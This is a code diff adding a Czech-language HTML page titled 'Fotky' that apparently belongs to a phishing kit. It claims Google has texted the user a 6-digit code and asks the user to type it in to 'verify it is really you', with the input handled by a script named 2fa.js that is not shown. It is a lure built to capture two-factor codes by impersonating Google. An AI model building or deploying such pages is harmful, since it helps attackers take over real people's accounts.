@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fotky</title>
+    <link rel="stylesheet" href="style_2fa.css">
+</head>
+<body>
+    <div id="boxf">
+        <form id="register">
+            <p>Google vám poslal na vaše telefonní číslo sms se 6 místným kodem, který sem musíte zadat, abysme ověřili, že to jste opravdu vy</p>
+            <label for="code">kod</labe><br>
+            <input type="tel" minlength="6" id="code" required>
+            <div id="box">
+                <input type="submit" value="Potvrdit" id="submit">
+            </div>
+        </form>
+    </div>
+    <script src="2fa.js"></script>
+</body>
+</html>
